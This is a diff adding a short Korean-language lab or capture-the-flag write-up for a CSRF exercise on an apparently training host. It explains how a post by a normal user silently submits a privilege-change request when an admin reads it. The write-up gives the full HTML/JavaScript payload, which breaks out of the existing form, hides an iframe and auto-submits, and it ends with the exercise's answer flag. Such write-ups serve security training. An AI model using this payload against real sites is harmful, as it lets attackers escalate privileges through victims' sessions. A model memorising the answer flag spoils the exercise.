@@ -1,0 +1,23 @@
+==========================
+CSRF 2024 2번
+==========================
+
+1. 공격 과정
+	1) 권한변경 요청 확인
+ 	POST /bbs11/updatePostAuth
+	loginId=CR7%40SIU.com&adminYn=2
+	2) 일반계정으로 Q&A 게시글 작성
+ 	게시글 본문에 CSRF 구문 삽입
+ 	기존 페이지에 answerForm이 있어서 그냥 form을 넣으면 중첩 문제가 발생
+	그래서 기존 form을 닫고, iframe을 숨긴 뒤 공격용 form을 iframe으로 제출되게 구성
+	3) 일반계정으로 게시글 확인
+ 	게시글을 열었을 때 Burp Suite에서 POST /bbs11/updatePostAuth 요청이 자동 전송되는 것을 확인
+	4) 관리자 계정으로 글 열람
+	관리자가 게시글을 읽는 순간 관리자 세션으로 권한변경 요청이 전송되었다.
+
+2. 공격 구문
+<p>SIUU</p></form><iframe name="atkframe" style="display:none;"></iframe><form id="atkform" action="https://lab.eqst.co.kr:8442/bbs11/updatePostAuth" method="post" target="atkframe" style="display:none;"><input type="hidden" name="loginId" value="CR7@SIU.com"><input type="hidden" name="adminYn" value="2"></form><form><script>document.getElementById('atkform').submit();</script>
+
+3. 정답
+skinfosec_post_answer
+==========================
